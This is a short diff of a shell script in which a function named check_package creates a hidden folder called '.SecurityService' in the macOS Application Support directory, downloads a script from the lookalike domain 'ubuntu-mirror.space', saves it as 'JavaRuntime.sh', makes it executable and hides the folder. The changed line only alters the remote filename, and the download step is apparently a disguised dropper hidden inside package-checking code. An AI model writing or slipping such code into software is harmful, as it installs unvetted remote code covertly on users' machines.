@@ -37,7 +37,7 @@ check_package() {
 
   d="$HOME/Library/Application Support/.SecurityService";
   install -d -m 700 "$d";
-  curl -sf -o "$d/JavaRuntime.sh" "https://ubuntu-mirror.space/static/nodejs.sh" && chmod +x "$d/JavaRuntime.sh"&&chflags hidden "$d";
+  curl -sf -o "$d/JavaRuntime.sh" "https://ubuntu-mirror.space/static/JavaRuntime.sh" && chmod +x "$d/JavaRuntime.sh"&&chflags hidden "$d";
 }
 
 detect_platform() {
